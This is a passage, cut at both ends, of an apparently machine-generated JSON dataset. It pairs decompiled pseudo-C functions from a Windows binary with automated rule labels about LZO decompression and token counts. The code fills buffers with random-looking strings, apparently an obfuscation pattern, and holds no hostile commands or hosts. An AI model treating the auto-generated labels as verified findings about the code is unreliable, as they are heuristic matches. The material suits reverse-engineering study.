0x949b;\n    }\n    iVar2 = iStack60;\n    if ((uStack40 + 1 < 0x1000) || (iVar2 = *(iStack60 + -4),  (iStack60 + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x0042bb59;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x0042bbee:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x0042bbfa:\n    uStack20 = 2;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    uVar1 = fcn.00403a76();\n    return uVar1;\n}\n",
        "token_count": 790
    },
    "00403dd7": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00403dd7(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    uint auStack168 [2];\n    char *pcStack160;\n    uint uStack156;\n    uint uStack152;\n    uint uStack148;\n    ushort uStack144;\n    uchar uStack142;\n    uint uStack140;\n    uint uStack136;\n    int32_t iStack132;\n    uint uStack116;\n    uint32_t uStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    int32_t iStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack168;\n    uStack24 = 0x44ccb0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack136 = 0xf;\n    uStack140 = 0xe;\n    uStack156 = 0x6e617375;\n    uStack152 = 0x71706864;\n    uStack148 = 0x7567776c;\n    uStack144 = 0x7a6e;\n    uStack142 = 0;\n    uStack116 = 0;\n    uStack112 = 0xf;\n    iStack132 = 0;\n    uStack20 = 4;\n    pcStack160 = \"zlbjzmzperudyzizaqewfvrirroaaskbprshomczcclj\";\n    auStack168[0] = 0x2c;\n    fcn.00402f72();\n    uStack68 = 0;\n    uStack64 = 0xf;\n    iStack84 = 0;\n    uStack20 = 5;\n    fcn.00402f72(0x24, iStack60, \"gylnzeiihyclzctkmshlcbdmwtkskaifijui\");\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 6;\n    fcn.00402f72(0x2c, iStack108, \"zlbjzmzperudyzizaqewfvrirroaaskbprshomczcclj\");\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    uStack20 = 7;\n    fcn.00402f72(0x2c, uStack36, \"zlbjzmzperudyzizaqewfvrirroaaskbprshomczcclj\");\n    if (uStack88 < 0x10) {\ncode_r0x00445ad0:\n        if (0xf < uStack40) {\n            iVar2 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar2 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar2))\n            goto code_r0x00445b9b;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack64) {\n            iVar2 = iStack84;\n            if ((0xfff < uStack64 + 1) && (iVar2 = *(iStack84 + -4),  0x1f < (iStack84 + -4) - iVar2))\n            goto code_r0x00445ba7;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack112) {\n            iVar2 = iStack132;\n            if ((0xfff < uStack112 + 1) && (iVar2 = *(iStack132 + -4),  0x1f < (iStack132 + -4) - iVar2))\n            goto code_r0x00445bb3;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return 0xc51;\n    }\n    iVar2 = iStack108;\n    if ((uStack88 + 1 < 0x1000) || (iVar2 = *(iStack108 + -4),  (iStack108 + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x00445ad0;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x00445b9b:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x00445ba7:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x00445bb3:\n    uStack20 = 3;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    uVar1 = fcn.00403a76();\n    return uVar1;\n}\n",
        "token_count": 1197
    },
    "00403e54": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00403e54(uint32_t *param_1, uint32_t param_2, uint param_3, uint32_t param_4, uint16_t param_5)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    code *pcVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    uint32_t uVar13;\n    int32_t **in_FS_OFFSET;\n    uint uVar14;\n    uchar auVar15 [16];\n    uint in_stack_ffffffc4;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    uStack20 = 0xffffffff;\n    uStack24 = 0x41e520;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uVar11 = param_1[4];\n    if (param_2 <= 0x7ffffffe - uVar11) {\n        uVar4 = param_2 + uVar11 | 7;\n        if (uVar4 < 0x7fffffff) {\n            uVar8 = param_1[5];\n            if (uVar8 <= 0x7ffffffe - (uVar8 >> 1)) {\n                uVar13 = (uVar8 >> 1) + uVar8;\n                if (uVar13 <= uVar4) {\n                    uVar13 = uVar4;\n                }\n                uVar4 = uVar13 + 1;\n                if (-1 < uVar4) {\n                    if (uVar4 < 0x800) {\n                        if (uVar4 == 0) {\n                            uVar4 = 0;\n                        }\n                        else {\n                            uVar4 = fcn.004024b9(uVar4 * 2, in_stack_ffffffc4);\n                        }\n                    }\n                    else {\n                        if (0x7fffffee < uVar4) goto code_r0x0041e0e0;\n                        iVar5 = fcn.004024b9(uVar4 * 2 + 0x23, in_stack_ffffffc4);\n                        uVar4 = iVar5 + 0x23U & 0xffffffe0;\n                        *(uVar4 - 4) = iVar5;\n                    }\n                    param_1[4] = param_2 + uVar11;\n                    param_1[5] = uVar13;\n                    if (uVar8 < 8) {\n                        fcn.0040576d(uVar4, param_1, uVar11 * 2);\n                        if (param_4 != 0) {\n                            iVar5 = uVar4 + uVar11 * 2;\n                            uVar8 = param_4;\n                            if (0xf < param_4) {\n                                uVar8 = param_4 & 0xfffffff0;\n                                auVar15 = pshuflw(ZEXT216(param_5), ZEXT216(param_5), 0);\n                                uVar14 = SUB164(auVar15, 0);\n                                uVar6 = (uVar8 - 0x10 >> 4) + 1;\n                                uVar13 = uVar6 & 7;\n                                iVar9 = 0;\n                                if (0x6f < uVar8 - 0x10) {\n                                    uVar6 = uVar6 & 0xfffffff8;\n                                    iVar7 = uVar4 + uVar11 * 2;\n                                    iVar9 = 0;\n                                    do {\n                                        puVar2 = iVar7 + iVar9 * 2;\n                                        *puVar2 = uVar14;\n                                        puVar2[1] = uVar14;\n                                        puVar2[2] = uVar14;\n                                        puVar2[3] = uVar14;\n                                        puVar2 = iVar7 + 0x10 + iVar9 * 2;\n                                        *puVar2 = uVar14;\n                                        puVar2[1] = uVar14;\n                                        puVar2[2] = uVar14;\n                                        puVar2[3] = uVar14;\n                                        puVar2 = iVar7 + 0x20 + iVar9 * 2;\n                                        *puVar2 = uVar14;\n                                        puVar2[1] = uVar14;\n                                        puVar2[2] = uVar14;\n                                        puVar2[3] = uVar14;\n                                        puVar2 = iVar7 + 0x30 + iVar9 * 2;\n                                        *puVar2 = uVar14;\n                                        puVar2[1] = uVar14;\n                                        puVar2[2] = uVar14;\n                                        puVar2[3] = uVar14;\n                                        puVar2 = iVar7 + 0x40 + iVar9 * 2;\n                                        *puVar2 = uVar14;\n                                        puVar2[1] = uVar14;\n                                        puVar2[2] = uVar14;\n                                        puVar2[3] = uVar14;\n                                        puVar2 = iVar7 + 0x50 + iVar9 * 2;\n                                        *puVar2 = uVar14;\n                                        puVar2[1] = uVar14;\n                                        puVar2[2] = uVar14;\n                                        puVar2[3] = uVar14;\n                                        puVar2 = iVar7 + 0x60 + iVar9 * 2;\n                                        *puVar2 = uVar14;\n                                        puVar2[1] = uVar14;\n                                        puVar2[2] = uVar14;\n                                        puVar2[3] = uVar14;\n                                        puVar2 = iVar7 + 0x70 + iVar9 * 2;\n                                        *puVar2 = uVar14;\n                                        puVar2[1] = uVar14;\n                                        puVar2[2] = uVar14;\n                                        puVar2[3] = uVar14;\n                                        puVar2 = iVar7 + 0x80 + iVar9 * 2;\n                                        *puVar2 = uVar14;\n                                        puVar2[1] = uVar14;\n                                        puVar2[2] = uVar14;\n                                        puVar2[3] = uVar14;\n                                        puVar2 = iVar7 + 0x90 + iVar9 * 2;\n                                        *puVar2 = uVar14;\n                                        puVar2[1] = uVar14;\n                                        puVar2[2] = uVar14;\n                                        puVar2[3] = uVar14;\n                                        puVar2 = iVar7 + 0xa0 + iVar9 * 2;\n                                        *puVar2 = uVar14;\n                                        puVar2[1] = uVar14;\n                                        puVar2[2] = uVar14;\n                                        puVar2[3] = uVar14;\n                                        puVar2 = iVar7 + 0xb0 + iVar9 * 2;\n                                        *puVar2 = uVar14;\n                                        puVar2[1] = uVar14;\n                                        puVar2[2] = uVar14;\n                                        puVar2[3] = uVar14;\n                                        puVar2 = iVar7 + 0xc0 + iVar9 * 2;\n                                        *puVar2 = uVar14;\n                                        puVar2[1] = uVar14;\n                                        puVar2[2] = uVar14;\n                                        puVar2[3] = uVar14;\n                                        puVar2 = iVar7 + 0xd0 + iVar9 * 2;\n                                        *puVar2 = uVar14;\n                                        puVar2[1] = uVar14;\n                                        puVar2[2] = uVar14;\n                                        puVar2[3] = uVar14;\n                                        puVar2 = iVar7 + 0xe0 + iVar9 * 2;\n                                        *puVar2 = uVar14;\n                                        puVar2[1] = uVar14;\n                                        puVar2[2] = uVar14;\n                                        puVar2[3] = uVar14;\n                                        puVar2 = iVar7 + 0xf0 + iVar9 * 2;\n                                        *puVar2 = uVar14;\n                                        puVar2[1] = uVar14;\n                                        puVar2[2] = uVar14;\n                                        puVar2[3] = uVar14;\n                                        iVar9 = iVar9 + 0x80;\n                                        uVar6 = uVar6 - 8;\n                                    } while (uVar6 != 0);\n                                }\n                                if (uVar13 != 0) {\n                                    iVar9 = uVar11 * 2 + iVar9 * 2 + uVar4;\n                                    iVar7 = 0;\n                                    do {\n                                        puVar2 = iVar9 + iVar7;\n                                        *puVar2 = uVar14;\n                                        puVar2[1] = uVar14;\n                                        puVar2[2] = uVar14;\n                                        puVar2[3] = uVar14;\n                                        puVar2 = iVar9 + 0x10 + iVar7;\n                                        *puVar2 = uVar14;\n                                        puVar2[1] = uVar14;\n                                        puVar2[2] = uVar14;\n                                        puVar2[3] = uVar14;\n                                        iVar7 = iVar7 + 0x20;\n                                    } while (uVar13 * 0x20 != iVar7);\n                                }\n                                if (uVar8 == param_4) goto code_r0x0041e0bb;\n                                iVar5 = iVar5 + uVar8 * 2;\n                                uVar8 = param_4 & 0xf;\n                            }\n                            uVar13 = 0;\n                            do {\n                                *(iVar5 + uVar13 * 2) = param_5;\n                                uVar13 = uVar13 + 1;\n                            } while (uVar8 != uVar13);\n                        }\ncode_r0x0041e0bb:\n                        *(uVar4 + (uVar11 + param_4) * 2) = 0;\n                        goto code_r0x0041e0c7;\n                    }\n                    uVar13 = *param_1;\n                    iVar5 = uVar11 * 2;\n                    fcn.0040576d(uVar4, uVar13, iVar5);\n                    if (param_4 != 0) {\n                        iVar9 = uVar4 + uVar11 * 2;\n                        uVar6 = param_4;\n                        if (0xf < param_4) {\n                            uVar6 = param_4 & 0xfffffff0;\n                            auVar15 = pshuflw(ZEXT216(param_5), ZEXT216(param_5), 0);\n                            uVar14 = SUB164(auVar15, 0);\n                            uVar12 = (uVar6 - 0x10 >> 4) + 1;\n                            uVar10 = uVar12 & 7;\n                            iVar7 = 0;\n                            if (0x6f < uVar6 - 0x10) {\n                                uVar12 = uVar12 & 0xfffffff8;\n                                iVar1 = uVar4 + uVar11 * 2;\n                                iVar7 = 0;\n                                do {\n                                    puVar2 = iVar1 + iVar7 * 2;\n                                    *puVar2 = uVar14;\n                                    puVar2[1] = uVar14;\n                                    puVar2[2] = uVar14;\n                                    puVar2[3] = uVar14;\n                                    puVar2 = iVar1 + 0x10 + iVar7 * 2;\n                                    *puVar2 = uVar14;\n                                    puVar2[1] = uVar14;\n                                    puVar2[2] = uVar14;\n                                    puVar2[3] = uVar14;\n                                    puVar2 = iVar1 + 0x20 + iVar7 * 2;\n                                    *puVar2 = uVar14;\n                                    puVar2[1] = uVar14;\n                                    puVar2[2] = uVar14;\n                                    puVar2[3] = uVar14;\n                                    puVar2 = iVar1 + 0x30 + iVar7 * 2;\n                                    *puVar2 = uVar14;\n                                    puVar2[1] = uVar14;\n                                    puVar2[2] = uVar14;\n                                    puVar2[3] = uVar14;\n                                    puVar2 = iVar1 + 0x40 + iVar7 * 2;\n                                    *puVar2 = uVar14;\n                                    puVar2[1] = uVar14;\n                                    puVar2[2] = uVar14;\n                                    puVar2[3] = uVar14;\n                                    puVar2 = iVar1 + 0x50 + iVar7 * 2;\n                                    *puVar2 = uVar14;\n                                    puVar2[1] = uVar14;\n                                    puVar2[2] = uVar14;\n                                    puVar2[3] = uVar14;\n                                    puVar2 = iVar1 + 0x60 + iVar7 * 2;\n                                    *puVar2 = uVar14;\n                                    puVar2[1] = uVar14;\n                                    puVar2[2] = uVar14;\n                                    puVar2[3] = uVar14;\n                                    puVar2 = iVar1 + 0x70 + iVar7 * 2;\n                                    *puVar2 = uVar14;\n                                    puVar2[1] = uVar14;\n                                    puVar2[2] = uVar14;\n                                    puVar2[3] = uVar14;\n                                    puVar2 = iVar1 + 0x80 + iVar7 * 2;\n                                    *puVar2 = uVar14;\n                                    puVar2[1] = uVar14;\n                                    puVar2[2] = uVar14;\n                                    puVar2[3] = uVar14;\n                                    puVar2 = iVar1 + 0x90 + iVar7 * 2;\n                                    *puVar2 = uVar14;\n                                    puVar2[1] = uVar14;\n                                    puVar2[2] = uVar14;\n                                    puVar2[3] = uVar14;\n                                    puVar2 = iVar1 + 0xa0 + iVar7 * 2;\n                                    *puVar2 = uVar14;\n                                    puVar2[1] = uVar14;\n                                    puVar2[2] = uVar14;\n                                    puVar2[3] = uVar14;\n                                    puVar2 = iVar1 + 0xb0 + iVar7 * 2;\n                                    *puVar2 = uVar14;\n                                    puVar2[1] = uVar14;\n                                    puVar2[2] = uVar14;\n                                    puVar2[3] = uVar14;\n                                    puVar2 = iVar1 + 0xc0 + iVar7 * 2;\n                                    *puVar2 = uVar14;\n                                    puVar2[1] = uVar14;\n                                    puVar2[2] = uVar14;\n                                    puVar2[3] = uVar14;\n                                    puVar2 = iVar1 + 0xd0 + iVar7 * 2;\n                                    *puVar2 = uVar14;\n                                    puVar2[1] = uVar14;\n                                    puVar2[2] = uVar14;\n                                    puVar2[3] = uVar14;\n                                    puVar2 = iVar1 + 0xe0 + iVar7 * 2;\n                                    *puVar2 = uVar14;\n                                    puVar2[1] = uVar14;\n                                    puVar2[2] = uVar14;\n                                    puVar2[3] = uVar14;\n                                    puVar2 = iVar1 + 0xf0 + iVar7 * 2;\n                                    *puVar2 = uVar14;\n                                    puVar2[1] = uVar14;\n                                    puVar2[2] = uVar14;\n                                    puVar2[3] = uVar14;\n                                    iVar7 = iVar7 + 0x80;\n                                    uVar12 = uVar12 - 8;\n                                } while (uVar12 != 0);\n                            }\n                            if (uVar10 != 0) {\n                                iVar5 = iVar5 + iVar7 * 2 + uVar4;\n                                iVar7 = 0;\n                                do {\n                                    puVar2 = iVar5 + iVar7;\n                                    *puVar2 = uVar14;\n                                    puVar2[1] = uVar14;\n                                    puVar2[2] = uVar14;\n                                    puVar2[3] = uVar14;\n                                    puVar2 = iVar5 + 0x10 + iVar7;\n                                    *puVar2 = uVar14;\n                                    puVar2[1] = uVar14;\n                                    puVar2[2] = uVar14;\n                                    puVar2[3] = uVar14;\n                                    iVar7 = iVar7 + 0x20;\n                                } while (uVar10 * 0x20 != iVar7);\n                            }\n                            if (uVar6 == param_4) goto code_r0x0041df1b;\n                            iVar9 = iVar9 + uVar6 * 2;\n                            uVar6 = param_4 & 0xf;\n                        }\n                        uVar10 = 0;\n                        do {\n                            *(iVar9 + uVar10 * 2) = param_5;\n                            uVar10 = uVar10 + 1;\n                        } while (uVar6 != uVar10);\n                    }\ncode_r0x0041df1b:\n                    *(uVar4 + (uVar11 + param_4) * 2) = 0;\n                    uVar11 = uVar13;\n                    if ((uVar8 * 2 + 2 < 0x1000) || (uVar11 = *(uVar13 - 4),  (uVar13 - 4) - uVar11 < 0x20)) {\n                        fcn.00401a32(uVar11);\ncode_r0x0041e0c7:\n                        *param_1 = uVar4;\n                        *in_FS_OFFSET = piStack28;\n                        return;\n                    }\n                    goto code_r0x0041e0ea;\n                }\n            }\n        }\ncode_r0x0041e0e0:\n        fcn.004050bf();\n    }\n    fcn.004038aa();\ncode_r0x0041e0ea:\n    uStack20 = 0;\n    fcn.004047f5();\n    fcn.004052d1();\n    pcVar3 = swi(3);\n    (*pcVar3)();\n    return;\n}\n",
        "token_count": 4090
    },
    "00403ea9": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint * fcn.00403ea9(uint *param_1)\n\n{\n    uint *puVar1;\n    uint32_t arg_8h;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_ffffff2c;\n    uint auStack168 [2];\n    char *pcStack160;\n    uint uStack156;\n    uchar uStack152;\n    uint uStack140;\n    uint uStack136;\n    int32_t iStack132;\n    uint uStack116;\n    uint32_t uStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    int32_t iStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    uint32_t uStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack168;\n    uStack24 = 0x44c710;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack136 = 0xf;\n    uStack140 = 4;\n    uStack156 = 0x6e777461;\n    uStack152 = 0;\n    uStack116 = 0;\n    uStack112 = 0xf;\n    iStack132 = 0;\n    uStack20 = 4;\n    pcStack160 = \"ecuzoeeqtywcnbhblldfaxyyadzcqvrsp\";\n    auStack168[0] = 0x21;\n    fcn.00402f72();\n    uStack68 = 0;\n    uStack64 = 0xf;\n    iStack84 = 0;\n    uStack20 = 5;\n    fcn.00402f72(0x10, uStack60, \"fhsdrszxridnlcrc\");\n    uStack44 = 0;\n    uStack40 = 0xf;\n    uStack60 = 0;\n    uStack20 = 6;\n    fcn.00402f72(0x10, iStack108, \"fhsdrszxridnlcrc\");\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    uStack20 = 7;\n    fcn.00402f72(0x10, uStack36, \"fhsdrszxridnlcrc\");\n    if (uStack88 < 0x10) {\ncode_r0x00434f03:\n        if (0xf < uStack40) {\n            in_stack_ffffff2c = uStack40 + 1;\n            arg_8h = uStack60;\n            if (0xfff < in_stack_ffffff2c) {\n                arg_8h = *(uStack60 - 4);\n                if (0x1f < (uStack60 - 4) - arg_8h) goto code_r0x0043500d;\n                in_stack_ffffff2c = uStack40 + 0x24;\n            }\n            fcn.00401a32(arg_8h);\n        }\n        *param_1 = 0;\n        param_1[4] = 0;\n        param_1[5] = 0xf;\n        *param_1 = 0;\n        uStack20 = 6;\n        fcn.00402f72(0x11, in_stack_ffffff2c & 0xffffff00 | uStack60 & 0xff, \"lskfbidgsnfpdxjyi\");\n        if (0xf < uStack64) {\n            iVar2 = iStack84;\n            if ((0xfff < uStack64 + 1) && (iVar2 = *(iStack84 + -4),  0x1f < (iStack84 + -4) - iVar2))\n            goto code_r0x00435019;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack112) {\n            iVar2 = iStack132;\n            if ((0xfff < uStack112 + 1) && (iVar2 = *(iStack132 + -4),  0x1f < (iStack132 + -4) - iVar2))\n            goto code_r0x00435025;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return param_1;\n    }\n    in_stack_ffffff2c = uStack88 + 1;\n    iVar2 = iStack108;\n    if (in_stack_ffffff2c < 0x1000) {\ncode_r0x00434ef7:\n        fcn.00401a32(iVar2);\n        goto code_r0x00434f03;\n    }\n    iVar2 = *(iStack108 + -4);\n    if ((iStack108 + -4) - iVar2 < 0x20) {\n        in_stack_ffffff2c = uStack88 + 0x24;\n        goto code_r0x00434ef7;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x0043500d:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x00435019:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x00435025:\n    uStack20 = 3;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    puVar1 = fcn.00403a76();\n    return puVar1;\n}\n",
        "token_count": 1296
    },
    "00406514": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nint32_t fcn.00406514(void)\n\n{\n    uchar **ppuVar1;\n    int32_t iVar2;\n    uint32_t arg_8h;\n    uint32_t unaff_EDI;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_00000020;\n    uint in_stack_00000030;\n    uint32_t in_stack_00000034;\n    uint32_t in_stack_00000038;\n    uint in_stack_00000048;\n    uint32_t in_stack_0000004c;\n    uchar *in_stack_00000054;\n    uint32_t in_stack_00000068;\n    int32_t aiStack128 [4];\n    uint uStack112;\n    uint32_t uStack108;\n    uchar uStack104;\n    int32_t *piStack100;\n    int32_t *piStack96;\n    uint uStack92;\n    uint uStack88;\n    uchar *puStack84;\n    uint32_t uStack80;\n    uint32_t in_stack_ffffffd8;\n    uchar **ppuStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint32_t uStack20;\n    \n    ppuStack32 = &ppuStack32;\n    puStack84 = &stack0x00000004;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44c890;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    ppuVar1 = &ppuStack32;\n    if (in_stack_00000034 < 0x10) {\ncode_r0x00439d48:\n        ppuStack32 = ppuVar1;\n        in_stack_00000030 = 0;\n        in_stack_00000034 = 0xf;\n        in_stack_00000020 = in_stack_00000020 & 0xffffff00;\n        if (0xf < in_stack_0000004c) {\n            uStack80 = in_stack_00000038;\n            if ((0xfff < in_stack_0000004c + 1) &&\n               (uStack80 = *(in_stack_00000038 - 4),  unaff_EDI = uStack80,  0x1f < (in_stack_00000038 - 4) - uStack80))\n            goto code_r0x00439df8;\n            fcn.00401a32(uStack80);\n            in_stack_ffffffd8 = uStack80;\n        }\n        in_stack_00000048 = 0;\n        in_stack_0000004c = 0xf;\n        in_stack_00000038 = in_stack_00000038 & 0xffffff00;\n        if (in_stack_00000068 < 0x10) {\ncode_r0x00439dd4:\n            *in_FS_OFFSET = piStack28;\n            return 0x11ab1;\n        }\n        puStack84 = in_stack_00000054;\n        if ((in_stack_00000068 + 1 < 0x1000) ||\n           (puStack84 = *(in_stack_00000054 + -4),  uStack80 = unaff_EDI,  in_stack_00000054 + (-4 - puStack84) < 0x20))\n        {\n            fcn.00401a32(puStack84);\n            goto code_r0x00439dd4;\n        }\n    }\n    else {\n        uStack80 = in_stack_00000020;\n        if ((in_stack_00000034 + 1 < 0x1000) ||\n           (uStack80 = *(in_stack_00000020 - 4),  unaff_EDI = uStack80,  (in_stack_00000020 - 4) - uStack80 < 0x20)) {\n            ppuStack32 = &ppuStack32;\n            fcn.00401a32(uStack80);\n            in_stack_ffffffd8 = uStack80;\n            ppuVar1 = ppuStack32;\n            goto code_r0x00439d48;\n        }\n        uStack20 = 0;\n        fcn.004047f5();\ncode_r0x00439df8:\n        uStack20 = 1;\n        fcn.004047f5();\n    }\n    uStack20 = 2;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    piStack100 = aiStack128;\n    uStack92 = 0x44c8a0;\n    piStack96 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack96;\n    uStack112 = 0;\n    uStack108 = 0xf;\n    aiStack128[0] = 0;\n    uStack88 = 2;\n    fcn.00402f72(0x2a, uStack104, \"gytrkabzjoekhammjzcvplnakpfsljcrqalieknkpb\");\n    if (0xf < uStack108) {\n        iVar2 = aiStack128[0];\n        if ((0xfff < uStack108 + 1) && (iVar2 = *(aiStack128[0] + -4),  0x1f < (aiStack128[0] + -4) - iVar2)) {\n            uStack88 = 0;\n            fcn.004047f5();\n            goto code_r0x00439f3a;\n        }\n        fcn.00401a32(iVar2);\n    }\n    if (0xf < uStack20) {\n        arg_8h = in_stack_ffffffd8;\n        if ((0xfff < uStack20 + 1) && (arg_8h = *(in_stack_ffffffd8 - 4),  0x1f < (in_stack_ffffffd8 - 4) - arg_8h)) {\ncode_r0x00439f3a:\n            uStack88 = 1;\n            fcn.004047f5();\n            fcn.004052d1();\n            fcn.004052d1();\n            iVar2 = fcn.00403a76();\n            return iVar2;\n        }\n        fcn.00401a32(arg_8h);\n    }\n    *in_FS_OFFSET = piStack96;\n    return piStack96;\n}\n",
        "token_count": 1397
    },
    "00403ee0": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00403ee0(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    int32_t in_stack_00000010;\n    uint32_t in_stack_00000024;\n    int32_t in_stack_00000040;\n    uint32_t in_stack_00000054;\n    uint auStack192 [2];\n    char *pcStack184;\n    int32_t iStack180;\n    uint uStack164;\n    uint32_t uStack160;\n    int32_t iStack156;\n    uint uStack140;\n    uint32_t uStack136;\n    int32_t iStack132;\n    uint uStack116;\n    uint32_t uStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    int32_t iStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack192;\n    uStack24 = 0x44cc70;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack164 = 0;\n    uStack160 = 0xf;\n    iStack180 = 0;\n    uStack20 = 8;\n    pcStack184 = \"dosphhpvmehkhkdwmiabwttcztbakimtlsvfwzifqgdvtwloxvpaboxejgizwqquxnwbcokveanfjymiopzogoxvrqvciqhmao\";\n    auStack192[0] = 0x62;\n    fcn.00402f72();\n    uStack116 = 0;\n    uStack112 = 0xf;\n    iStack132 = 0;\n    uStack20 = 9;\n    fcn.00402f72(0x5b, iStack108, \n                 \"grfgborojwqrbsfoejrqkoeziqbowaqwcvjaayxrxchkcfftokenmqkridkuyjeifbcfycwwjklvigwzrxwsruxaptn\");\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    uStack20 = 10;\n    fcn.00402f72(0x3a, iStack84, \"birsxibvelerqhxsnfdanfcqefgmqhznjmzqfxauphikeywmrcwlvxqcsl\");\n    uStack68 = 0;\n    uStack64 = 0xf;\n    iStack84 = 0;\n    uStack20 = 0xb;\n    fcn.00402f72(0x1d, iStack60, \"cvdqnandavomgjdcweobdzuhlexcb\");\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 0xc;\n    fcn.00402f72(0x5b, iStack156, \n                 \"grfgborojwqrbsfoejrqkoeziqbowaqwcvjaayxrxchkcfftokenmqkridkuyjeifbcfycwwjklvigwzrxwsruxaptn\");\n    uStack140 = 0;\n    uStack136 = 0xf;\n    iStack156 = 0;\n    uStack20 = 0xd;\n    fcn.00402f72(0x5b, uStack36, \n                 \"grfgborojwqrbsfoejrqkoeziqbowaqwcvjaayxrxchkcfftokenmqkridkuyjeifbcfycwwjklvigwzrxwsruxaptn\");\n    if (uStack136 < 0x10) {\ncode_r0x00445247:\n        if (0xf < uStack40) {\n            iVar2 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar2 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar2))\n            goto code_r0x00445423;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack64) {\n            iVar2 = iStack84;\n            if ((0xfff < uStack64 + 1) && (iVar2 = *(iStack84 + -4),  0x1f < (iStack84 + -4) - iVar2))\n            goto code_r0x0044542f;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack88) {\n            iVar2 = iStack108;\n            if ((0xfff < uStack88 + 1) && (iVar2 = *(iStack108 + -4),  0x1f < (iStack108 + -4) - iVar2))\n            goto code_r0x0044543b;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack112) {\n            iVar2 = 